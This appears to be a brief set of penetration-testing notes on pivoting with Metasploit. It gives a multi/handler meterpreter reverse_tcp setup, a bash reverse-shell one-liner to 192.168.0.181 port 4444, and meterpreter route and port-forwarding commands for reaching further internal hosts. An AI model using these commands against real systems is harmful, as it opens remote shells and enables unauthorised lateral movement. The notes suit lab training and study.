### Pivoting 

use /multi/handler

```python

payload/linux/x86/meterpreter/reverse_tcp

```
run
```python
sh -i >& /dev/tcp/192.168.0.181/4444 0>&1
```

route add
```python
route add 10.0.2.4 255.255.255.0 2
```

pivoting by portforgarding 
```python
portfwd add -l 7777 -p 21 -r 10.0.2.5
```
